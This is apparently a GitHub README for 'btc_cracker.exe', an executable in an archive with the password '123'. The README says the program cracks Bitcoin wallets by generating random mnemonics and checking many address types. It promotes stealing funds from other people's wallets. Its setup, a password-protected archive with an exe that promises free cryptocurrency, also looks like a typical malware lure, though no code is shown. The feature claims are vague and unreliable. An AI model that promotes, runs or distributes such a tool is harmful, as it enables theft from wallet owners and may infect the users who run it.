# How to use 

1) The password for the archive is - 123

2) Open btc_cracker.exe

3) Click START and wait softwere to crack some wallets.

4) The result of the session will be saved in the text file "log".

![Image alt](https://github.com/Lexyizzy/Cracker/blob/main/btc.gif)

# About:

all code optimize for threading in any pc and tablet can running with c++. You don’t need to download or install anything additional to work!

![Image alt](https://github.com/Lexyizzy/Cracker/blob/main/btc2.gif)

+ Use Node Exclusive.

+ High speed checker

+ Check all address type 

p2pkh , p2sh , p2wsh , p2wpkh , p2wsh in p2sh and p2wpkh in p2sh

+ Add counter for win.

+ Use cpu system very low.

+ Create mnemonic (random) and convert to hex from addresses.

+ Optimize script.

+ Easy start and fast work.
